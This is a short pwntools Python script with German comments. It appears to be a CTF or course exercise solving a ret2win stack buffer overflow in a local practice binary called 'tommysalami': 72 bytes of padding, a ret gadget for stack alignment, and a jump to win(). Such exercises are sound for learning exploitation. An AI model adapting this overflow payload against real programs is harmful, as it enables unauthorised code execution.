from pwn import *

#die binary file laden und den exploit context setzen
binary = './tommysalami'
elf = context.binary = ELF(binary)
context.log_level = 'debug' #für debugging purposes alle abläufe während des exploits anzeigen

# adresse der win func aus der symbol table
win_addr = elf.symbols['win']
log.info(f"win() @ {hex(win_addr)}")

#einfaches ret gadget für das stack alignment (kann ofc je nach binary varrieren)
ret = 0x40101a

# der ermittelte offset
offset = 72

# ROP chain, payload bauen
payload = b'A' * offset
payload += p64(ret)        # stack alignment
payload += p64(win_addr)   # ROP - sprung zu win()

#prozess starten und die payload senden
io = process(binary)
io.sendline(payload)
#interactive mode, also shell
io.interactive()

#Quelle der Hilfestellung für die Skripte in der Dokumentation

